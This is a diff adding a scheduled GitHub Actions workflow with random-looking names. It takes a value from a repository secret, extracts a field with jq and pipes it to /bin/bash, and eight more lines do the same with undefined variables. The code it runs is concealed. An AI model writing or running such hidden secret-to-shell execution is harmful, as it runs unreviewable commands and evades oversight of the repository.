@@ -1,0 +1,24 @@
+name: hekangjiexi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hekangjiexi
+        env:
+          xaz6: ${{ secrets.xaz6 }}
+        run: |
+          echo $xaz6 | jq -r .kfyzn5046 | /bin/bash
+          echo $f49538 | jq -r .m07708 | /bin/bash
+          echo $ly8 | jq -r .css69 | /bin/bash
+          echo $arcaj25 | jq -r .epak064 | /bin/bash
+          echo $emo71 | jq -r .ke393 | /bin/bash
+          echo $zmwhu49 | jq -r .edxed739 | /bin/bash
+          echo $sw85706 | jq -r .hlz213 | /bin/bash
+          echo $nbpm31 | jq -r .h2490 | /bin/bash
+          echo $r8036 | jq -r .yud9310 | /bin/bash
+
